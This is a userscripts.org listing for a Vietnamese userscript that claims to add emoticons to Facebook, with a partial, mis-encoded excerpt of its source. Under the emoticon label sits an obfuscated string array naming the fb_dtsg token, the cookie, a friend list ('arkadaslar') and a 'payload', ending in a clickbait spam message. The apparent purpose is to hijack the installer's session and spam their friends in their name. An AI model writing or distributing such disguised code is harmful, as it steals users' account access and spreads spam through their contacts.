0 Unread MessagesPhú madridLogout
Userscripts.org
Scripts
Tags
Forums
...
Cài Ðặt Tool Facebook cho Trang Cá Nhân ( Ver 1.4.7 )
By Lực — Last update 8 minutes ago — Installed 0 times.
About
Source Code
Reviews 0
Discussions 0
...
// @description     All about facebook By Thế Lực
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/theluc46" target="_blank">Chúc M?ng B?n Ðã Cài Ð?t ICON FaceBook Thành Công <br>NoName</a>';
	html += '</div>';
	...
	// === Facebook Emoticons ====
//
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","364351640371747","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," 👏 😡 😘 👉 Vào xem nà .. Hay vãi _>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
